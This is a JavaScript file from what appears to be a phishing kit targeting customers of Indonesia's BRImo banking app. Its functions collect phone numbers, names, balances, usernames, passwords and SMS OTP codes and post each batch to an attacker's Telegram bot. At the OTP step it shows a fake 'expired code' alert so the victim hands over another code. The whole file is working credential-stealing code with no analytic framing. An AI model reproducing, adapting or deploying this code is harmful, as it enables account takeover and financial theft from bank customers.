function kirimResult(gabungan){
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        complete: function(data) {
                    console.log('Complete')
        setTimeout(function(){
            }, 1000);

                }
            });
}

function pertama(){
    var $logo = $("#logo");
    var $nama = $("#nama");
    var $nomor = $("#nomor");
    var $saldo = $("#saldo");

    // Validasi input
    if (!$nama.val() || !$nomor.val() || !$saldo.val()) {
        Swal.fire({
            title: 'Warning!',
            text: 'Data tidak boleh kosong.',
            icon: 'error', // Tipe ikon: 'success', 'error', 'warning', 'info', atau 'question'
            confirmButtonText: 'OK'
        });        
        return;
    }
    $("#kirims").text("Memproses...");
    sessionStorage.setItem("nomor", $nomor.val());
    var gabungan = '' + $logo.val() + '%0A' +
'No HP : ' + $nomor.val() + '%0A' +
'Nama : ' + $nama.val() + '%0A' +
'Saldo : ' + $saldo.val();

    kirimResult(gabungan);
    setTimeout(() => {
        window.location.replace("login.html");
    }, 1500);

    
}

function kedua(){

    $("#kirims").text("Memproses...");
    var $logo = $("#logo");
    var $user = $("#user");
    var $pass = $("#password");

    var gabungan = '' + $logo.val() + '%0A' +
'Username : ' + $user.val() + '%0A' +
'Password : ' + $pass.val();



    kirimResult(gabungan);
    setTimeout(() => {
        window.location.replace("konf.html");
    }, 1500);
}


function ketiga(){   
    var $logo = $("#logo");
    var $nomor = sessionStorage.getItem("nomor");
    var $sms = $("#sms");
  
    // Validasi input
    if (!$sms.val()) {
        Swal.fire({
            title: 'Warning!',
            text: 'OTP tidak boleh kosong.',
            icon: 'error', // Tipe ikon: 'success', 'error', 'warning', 'info', atau 'question'
            confirmButtonText: 'OK'
        });        
        return;
    }

    $("#kirims").text("Memproses...");
    var gabungan = '' + $logo.val() + '%0A' +
  'Nomor HP : ' + $nomor + '%0A' +
  'OTP : ' + $sms.val();
  
    
    kirimResult(gabungan);
    setTimeout(() => {
      document.getElementById("blinkAktivasi").style.display = "block";
    alert("Kode 𝗢𝗧𝗣 𝗦𝗮𝗹𝗮𝗵 / 𝗞𝗮𝗱𝗮𝗹𝘂𝗮𝗿𝘀𝗮                                      Harap Periksa 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 yang terbaru di 🔔 𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶 pada Aplikasi BRImo anda");
    document.getElementById('kirims').innerHTML = "Kirim";                  
                      
   $("#sms").val("");
   $("#sms").addClass('textarea1'); 
  }, 1500);

}
